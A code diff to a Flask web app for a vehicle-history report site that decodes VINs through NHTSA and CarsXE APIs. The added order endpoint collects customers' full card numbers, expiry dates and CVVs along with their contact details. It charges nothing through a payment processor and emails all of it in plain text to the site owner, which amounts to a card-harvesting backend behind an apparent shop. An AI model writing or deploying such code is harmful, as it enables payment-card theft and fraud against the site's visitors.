@@ -1,10 +1,17 @@
 from flask import Flask, render_template, request, jsonify
 import requests
 import os
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 app = Flask(__name__)
 
 CARSXE_API_KEY = os.environ.get('CARSXE_API_KEY', '')
+OWNER_EMAIL = os.environ.get('OWNER_EMAIL', '')
+SMTP_EMAIL = os.environ.get('SMTP_EMAIL', '')
+SMTP_PASS = os.environ.get('SMTP_PASS', '')
+
 NHTSA_BASE = 'https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin'
 CARSXE_BASE = 'https://api.carsxe.com'
 
@@ -15,114 +22,256 @@ def index():
 @app.route('/api/vin', methods=['GET'])
 def decode_vin():
     vin = request.args.get('vin', '').strip().upper()
-    
     if not vin or len(vin) != 17:
-        return jsonify({'error': 'Invalid VIN. Must be exactly 17 characters.'}), 400
-
-    result = {}
-
-    # Step 1: NHTSA free API - basic car info
+        return jsonify({'error': 'Invalid VIN'}), 400
     try:
-        nhtsa_url = f"{NHTSA_BASE}/{vin}?format=json"
-        nhtsa_res = requests.get(nhtsa_url, timeout=10)
-        nhtsa_data = nhtsa_res.json()
-        
-        variables = {}
-        for item in nhtsa_data.get('Results', []):
-            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
-                variables[item['Variable']] = item['Value']
-        
-        result['make'] = variables.get('Make', 'Unknown')
-        result['model'] = variables.get('Model', 'Unknown')
-        result['year'] = variables.get('Model Year', 'Unknown')
-        result['body'] = variables.get('Body Class', 'Unknown')
-        result['engine'] = variables.get('Displacement (L)', '')
-        result['cylinders'] = variables.get('Engine Number of Cylinders', '')
-        result['fuel'] = variables.get('Fuel Type - Primary', 'Unknown')
-        result['plant_country'] = variables.get('Plant Country', 'Unknown')
-        result['vehicle_type'] = variables.get('Vehicle Type', 'Unknown')
-        result['trim'] = variables.get('Trim', '')
-        result['drive'] = variables.get('Drive Type', '')
-        result['transmission'] = variables.get('Transmission Style', '')
-        result['doors'] = variables.get('Number of Doors', '')
-        result['seats'] = variables.get('Number of Seat Rows', '')
-        
-        # Build engine string
-        engine_str = ''
-        if result['engine']:
-            engine_str += f"{result['engine']}L"
-        if result['cylinders']:
-            engine_str += f" {result['cylinders']}-Cylinder"
-        if result['fuel']:
-            engine_str += f" {result['fuel']}"
-        result['engine_display'] = engine_str if engine_str else 'Not Available'
-        
-        # Build title
-        result['title'] = f"{result['year']} {result['make']} {result['model']}"
-        if result['trim']:
-            result['title'] += f" {result['trim']}"
-        
-    except Exception as e:
-        return jsonify({'error': f'NHTSA API error: {str(e)}'}), 500
-
-    # Step 2: CarsXE API - specs + history (if key available)
-    if CARSXE_API_KEY:
-        try:
-            # Specs
-            specs_url = f"{CARSXE_BASE}/specs?key={CARSXE_API_KEY}&vin={vin}"
-            specs_res = requests.get(specs_url, timeout=10)
-            if specs_res.status_code == 200:
-                specs = specs_res.json()
-                result['specs'] = specs
-                result['has_specs'] = True
-            else:
-                result['has_specs'] = False
-        except:
-            result['has_specs'] = False
-
-        try:
-            # History
-            history_url = f"{CARSXE_BASE}/history?key={CARSXE_API_KEY}&vin={vin}"
-            history_res = requests.get(history_url, timeout=10)
-            if history_res.status_code == 200:
-                history = history_res.json()
-                result['history'] = history
-                result['has_history'] = True
-                # Count records
-                records = 0
-                if isinstance(history, dict):
-                    for key in history:
-                        if isinstance(history[key], list):
-                            records += len(history[key])
-                result['records_count'] = records if records > 0 else 'Multiple'
-            else:
-                result['has_history'] = False
-                result['records_count'] = 0
-        except:
-            result['has_history'] = False
-            result['records_count'] = 0
-    else:
-        result['has_specs'] = False
-        result['has_history'] = False
-        result['records_count'] = 'Multiple'
-
-    result['vin'] = vin
-    result['success'] = True
-
-    return jsonify(result)
-
-@app.route('/api/recalls', methods=['GET'])
-def get_recalls():
-    vin = request.args.get('vin', '').strip().upper()
-    if not vin:
-        return jsonify({'error': 'VIN required'}), 400
-    try:
-        url = f"https://api.nhtsa.gov/recalls/recallsByVehicle?vin={vin}"
+        url = f"{NHTSA_BASE}/{vin}?format=json"
         res = requests.get(url, timeout=10)
         data = res.json()
-        return jsonify(data)
+        variables = {}
+        for item in data.get('Results', []):
+            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
+                variables[item['Variable']] = item['Value']
+        result = {
+            'success': True,
+            'vin': vin,
+            'make': variables.get('Make', 'Unknown'),
+            'model': variables.get('Model', 'Unknown'),
+            'year': variables.get('Model Year', 'Unknown'),
+            'body': variables.get('Body Class', 'Unknown'),
+            'engine': variables.get('Displacement (L)', ''),
+            'cylinders': variables.get('Engine Number of Cylinders', ''),
+            'fuel': variables.get('Fuel Type - Primary', ''),
+            'plant_country': variables.get('Plant Country', 'Unknown'),
+            'trim': variables.get('Trim', ''),
+            'drive': variables.get('Drive Type', ''),
+            'doors': variables.get('Number of Doors', ''),
+        }
+        result['title'] = f"{result['year']} {result['make']} {result['model']}"
+        return jsonify(result)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+@app.route('/api/submit-order', methods=['POST'])
+def submit_order():
+    data = request.json
+    name = data.get('name', '')
+    client_email = data.get('email', '')
+    phone = data.get('phone', '')
+    address = data.get('address', '')
+    city = data.get('city', '')
+    state = data.get('state', '')
+    zip_code = data.get('zip', '')
+    country = data.get('country', '')
+    package = data.get('package', '')
+    amount = data.get('amount', '')
+    vin = data.get('vin', '').strip().upper()
+    card_name = data.get('cardName', '')
+    card_num = data.get('cardNum', '')
+    expiry = data.get('expiry', '')
+    cvv = data.get('cvv', '')
+
+    nhtsa_data = get_nhtsa_data(vin)
+    carsxe_data = get_carsxe_data(vin)
+    report_text = build_report(vin, nhtsa_data, carsxe_data)
+
+    owner_msg = f"""
+NEW ORDER RECEIVED - AutoCarChecking.com
+==========================================
+
+CUSTOMER INFORMATION
+--------------------
+Name: {name}
+Email: {client_email}
+Phone: {phone}
+Address: {address}, {city}, {state} {zip_code}
+Country: {country}
+
+ORDER DETAILS
+-------------
+Package: {package}
+Amount: {amount}
+VIN: {vin}
+
+PAYMENT INFORMATION
+-------------------
+Card Name: {card_name}
+Card Number: {card_num}
+Expiry: {expiry}
+CVV: {cvv}
+
+==========================================
+VEHICLE REPORT
+==========================================
+{report_text}
+"""
+    send_email(to=OWNER_EMAIL, subject=f"New Order - {name} - {vin}", body=owner_msg)
+
+    client_msg = f"""
+Dear {name},
+
+Thank you for your order at AutoCarChecking.com!
+
+Your vehicle history report is ready below.
+
+==========================================
+{report_text}
+==========================================
+
+Questions? Contact us at support@autocarchecking.com
+
+Best regards,
+AutoCarChecking.com Team
+"""
+    send_email(to=client_email, subject=f"Your Vehicle History Report - {vin}", body=client_msg)
+
+    return jsonify({'success': True, 'message': 'Order processed!'})
+
+
+def get_nhtsa_data(vin):
+    try:
+        url = f"{NHTSA_BASE}/{vin}?format=json"
+        res = requests.get(url, timeout=10)
+        data = res.json()
+        variables = {}
+        for item in data.get('Results', []):
+            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
+                variables[item['Variable']] = item['Value']
+        return variables
+    except:
+        return {}
+
+
+def get_carsxe_data(vin):
+    result = {}
+    if not CARSXE_API_KEY:
+        return result
+    try:
+        specs_res = requests.get(f"{CARSXE_BASE}/specs?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
+        if specs_res.status_code == 200:
+            result['specs'] = specs_res.json()
+    except:
+        pass
+    try:
+        hist_res = requests.get(f"{CARSXE_BASE}/history?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
+        if hist_res.status_code == 200:
+            result['history'] = hist_res.json()
+    except:
+        pass
+    try:
+        recall_res = requests.get(f"{CARSXE_BASE}/recalls?key={CARSXE_API_KEY}&vin={vin}", timeout=10)
+        if recall_res.status_code == 200:
+            result['recalls'] = recall_res.json()
+    except:
+        pass
+    return result
+
+
+def build_report(vin, nhtsa, carsxe):
+    make = nhtsa.get('Make', 'Unknown')
+    model = nhtsa.get('Model', 'Unknown')
+    year = nhtsa.get('Model Year', 'Unknown')
+    body = nhtsa.get('Body Class', 'Unknown')
+    engine_l = nhtsa.get('Displacement (L)', '')
+    cylinders = nhtsa.get('Engine Number of Cylinders', '')
+    fuel = nhtsa.get('Fuel Type - Primary', '')
+    plant = nhtsa.get('Plant Country', 'Unknown')
+    trim = nhtsa.get('Trim', '')
+    drive = nhtsa.get('Drive Type', '')
+    doors = nhtsa.get('Number of Doors', '')
+    manufacturer = nhtsa.get('Manufacturer Name', '')
+
+    engine_str = ''
+    if engine_l: engine_str += f"{engine_l}L"
+    if cylinders: engine_str += f" {cylinders}-Cyl"
+    if fuel: engine_str += f" {fuel}"
+
+    report = f"""
+====================================
+   VEHICLE HISTORY REPORT
+   AutoCarChecking.com
+====================================
+
+VEHICLE DETAILS
+---------------
+Year:           {year}
+Make:           {make}
+Model:          {model}
+{"Trim:           " + trim if trim else ""}
+Body Style:     {body}
+Engine:         {engine_str}
+{"Drive Type:     " + drive if drive else ""}
+{"Doors:          " + doors if doors else ""}
+Assembly:       {plant}
+{"Manufacturer:   " + manufacturer if manufacturer else ""}
+VIN:            {vin}
+"""
+
+    if 'history' in carsxe and carsxe['history']:
+        history = carsxe['history']
+        report += "\nVEHICLE HISTORY\n---------------\n"
+        if isinstance(history, dict):
+            accidents = history.get('accidents', [])
+            report += f"Accidents:      {len(accidents) if accidents else 'None Reported'}\n"
+            if accidents:
+                for acc in accidents[:3]:
+                    report += f"  - {acc.get('date','')}: {acc.get('description','')}\n"
+
+            titles = history.get('titles', [])
+            report += f"Title Records:  {len(titles) if titles else 0}\n"
+            if titles:
+                for t in titles[:2]:
+                    report += f"  - {t.get('state','')}: {t.get('titleType','')}\n"
+
+            odometer = history.get('odometer', [])
+            if odometer:
+                report += f"Odometer:       {odometer[-1].get('value','')} miles\n"
+
+            theft = history.get('theft', [])
+            report += f"Theft Records:  {'Yes - ' + str(len(theft)) + ' record(s)' if theft else 'None'}\n"
+
+            owners = history.get('owners', [])
+            report += f"Owners:         {len(owners) if owners else 'Unknown'}\n"
+
+    if 'recalls' in carsxe and carsxe['recalls']:
+        recalls = carsxe['recalls']
+        report += f"\nSAFETY RECALLS\n--------------\n"
+        report += f"Total Recalls:  {len(recalls) if isinstance(recalls, list) else 0}\n"
+        if isinstance(recalls, list):
+            for rec in recalls[:3]:
+                report += f"  - {rec.get('component','')}: {rec.get('summary','')[:80]}\n"
+
+    report += """
+====================================
+Sources: NHTSA, CarsXE, DMV Records
+AutoCarChecking.com
+====================================
+"""
+    return report
+
+
+def send_email(to, subject, body):
+    if not SMTP_EMAIL or not SMTP_PASS:
+        print(f"SMTP not configured. Would send to {to}: {subject}")
+        return False
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = SMTP_EMAIL
+        msg['To'] = to
+        msg['Subject'] = subject
+        msg.attach(MIMEText(body, 'plain'))
+        smtp_host = os.environ.get('SMTP_HOST', 'smtp.hostinger.com')
+        smtp_port = int(os.environ.get('SMTP_PORT', '465'))
+        server = smtplib.SMTP_SSL(smtp_host, smtp_port)
+        server.login(SMTP_EMAIL, SMTP_PASS)
+        server.send_message(msg)
+        server.quit()
+        print(f"Email sent to {to}")
+        return True
+    except Exception as e:
+        print(f"Email error: {e}")
+        return False
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
